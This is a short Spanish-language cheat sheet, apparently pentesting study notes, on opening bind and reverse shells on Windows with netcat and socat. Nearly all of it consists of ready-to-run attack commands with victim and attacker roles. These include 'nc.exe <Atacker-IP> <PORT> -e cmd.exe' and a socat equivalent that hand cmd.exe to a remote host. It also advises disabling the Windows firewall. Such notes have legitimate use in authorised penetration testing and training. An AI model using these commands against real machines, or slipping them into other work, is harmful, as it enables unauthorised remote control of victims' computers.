**Uso de Socat y Netcat para Reverse y Bind Shells en Windows**

---

### 1. Consideraciones previas

* Windows no incluye nativamente `socat` ni `netcat`.
* Deben subirse versiones compatibles (`nc.exe`, `socat.exe`) o usar binarios precompilados.
* Permisos administrativos facilitan ejecución y apertura de puertos.

---

### 2. Netcat en Windows

#### Bind Shell (Windows escucha, atacante se conecta)

**Windows (víctima):**

```cmd
nc.exe -lvnp <PORT> -e cmd.exe
```

* `-l` listen, `-v` verbose, `-n` no DNS, `-p` puerto, `-e` ejecuta cmd.exe.
* Escucha conexiones entrantes y lanza cmd.

**Atacante:**

```bash
nc <Victim-IP> <PORT>
```

---

#### Reverse Shell (Windows conecta a atacante)

**Atacante:**

```bash
nc -lvnp <PORT>
```

**Windows (víctima):**

```cmd
nc.exe <Atacker-IP> <PORT> -e cmd.exe
```

---

### 3. Socat en Windows

* Socat en Windows es menos común, pero se puede usar con Cygwin o compilaciones específicas.

#### Bind Shell (Windows escucha):

```cmd
socat.exe TCP-LISTEN:<PORT>,reuseaddr,fork EXEC:cmd.exe
```

#### Reverse Shell (Windows conecta):

```cmd
socat.exe EXEC:cmd.exe TCP:<Atacker-IP>:<PORT>
```

---

### 4. Ejecución y requisitos

* Subir binarios `nc.exe` o `socat.exe` a Windows.
* Ejecutar en CMD o PowerShell con privilegios adecuados.
* Configurar listener en atacante (`nc -lvnp <PORT>` o `socat TCP-LISTEN:<PORT> -`).
* Abrir puertos en firewall Windows o deshabilitar temporalmente.
* Validar conectividad entre máquinas.

---

### 5. Limitaciones y alternativas

* Versiones de netcat sin opción `-e` no funcionan para shells directas.
* Socat puede requerir entorno POSIX emulado.
* PowerShell es alternativa para reverse shell más robusta y nativa.

---